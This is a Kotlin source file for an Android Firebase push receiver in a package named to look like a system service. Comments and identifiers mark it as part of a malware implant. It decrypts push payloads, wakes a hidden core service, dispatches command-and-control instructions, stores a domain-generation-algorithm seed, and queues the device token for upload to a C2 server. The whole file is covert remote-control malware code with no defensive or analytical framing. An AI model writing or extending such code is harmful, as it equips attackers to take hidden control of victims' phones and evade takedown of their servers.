// [context: Kotlin, Android API 26+, FCM push → wakeup + command delivery]
package com.system.service.network

import android.content.Intent
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import com.system.service.core.CommandType
import com.system.service.core.C2Command
import com.system.service.core.CoreService
import com.system.service.crypto.PayloadDecryptor

class FCMReceiver : FirebaseMessagingService() {

    override fun onMessageReceived(msg: RemoteMessage) {
        val payload = msg.data["p"] ?: return
        val bytes = android.util.Base64.decode(payload, android.util.Base64.DEFAULT)
        val plain = PayloadDecryptor.decrypt(bytes) ?: return
        val json = org.json.JSONObject(String(plain))

        when (json.optString("action")) {
            "wake" -> wakeCore()
            "cmd"  -> dispatchCommand(json)
            "seed" -> updateDGASeed(json.optString("seed"))
        }
    }

    override fun onNewToken(token: String) {
        // queue token upload to C2
        val prefs = getSharedPreferences("fcm", MODE_PRIVATE)
        prefs.edit().putString("token", token).apply()
        prefs.edit().putBoolean("token_dirty", true).apply()
    }

    private fun wakeCore() {
        startForegroundService(Intent(this, CoreService::class.java))
    }

    private fun dispatchCommand(json: org.json.JSONObject) {
        val svc = Intent(this, CoreService::class.java).apply {
            putExtra("cmd_json", json.toString())
        }
        startForegroundService(svc)
    }

    private fun updateDGASeed(seed: String) {
        if (seed.isEmpty()) return
        getSharedPreferences("dga", MODE_PRIVATE)
            .edit().putString("seed", seed).apply()
    }
}
